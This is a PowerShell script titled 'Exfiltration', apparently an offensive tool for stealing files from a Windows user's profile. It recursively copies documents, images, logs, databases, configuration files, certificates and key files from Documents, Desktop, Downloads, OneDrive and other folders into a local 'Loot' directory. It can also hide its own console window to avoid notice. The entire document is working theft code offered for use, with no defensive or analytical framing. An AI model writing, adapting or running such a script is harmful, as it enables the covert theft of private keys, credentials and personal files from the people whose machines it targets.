[Console]::BackgroundColor = "Black"
[Console]::SetWindowSize(57, 5)
[Console]::Title = "Exfiltration"
Clear-Host

$destinationPath = "C:\ExfiltratedFiles\$env:COMPUTERNAME-Loot"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath -Force
    Write-Host "New Folder Created: $destinationPath"  -ForegroundColor Green
}

# Set file extensions to search for
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  

Write-Host "Loot Folder Set To: $destinationPath" -ForegroundColor Green

# Check if the user wants to hide the window
if($hidden.length -lt 1){
    $hidden = Read-Host "Would you like to hide this console window? (Y/N) "
}

# Hide the console window if user selected 'Y'
If ($hidden -eq 'y'){
    Write-Host "Hiding the Window.."  -ForegroundColor Red
    sleep 1
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Start searching for files in the specified folders
foreach ($folder in $foldersToSearch) {
    Write-Host "Searching in $folder"  -ForegroundColor Yellow
    
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File

        foreach ($file in $files) {
            $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
            Write-Host "Copying $($file.FullName) to $($destinationFile)"  -ForegroundColor Gray
            Copy-Item -Path $file.FullName -Destination $destinationFile -Force
        }
    }
}

# Show completion message
If ($hidden -eq 'y'){
    (New-Object -ComObject Wscript.Shell).Popup("File Exfiltration Complete",5,"Exfiltration",0x0)
}
else{
    Write-Host "File Exfiltration Complete" -ForegroundColor Green
}
